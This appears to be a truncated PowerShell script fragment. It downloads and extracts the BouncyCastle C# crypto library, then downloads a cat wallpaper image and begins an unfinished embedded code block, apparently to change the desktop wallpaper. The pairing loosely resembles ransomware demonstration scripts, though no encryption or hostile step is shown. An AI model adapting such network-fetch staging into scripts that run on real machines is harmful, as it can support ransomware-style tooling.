Invoke-WebRequest -Uri 'https://www.bouncycastle.org/csharp/download/bccrypto-csharp-1.9.0-bin.zip' -OutFile './crypto.zip'
Expand-Archive ./crypto.zip -DestinationPath .
...
Invoke-WebRequest -Uri 'https://c4.wallpaperflare.com/wallpaper/927/710/567/6-cat-funny-grumpy-wallpaper-thumb.jpg' -OutFile './Nice.jpg'
$MyWallpaper=".\Nice.jpg"
$code = @' 
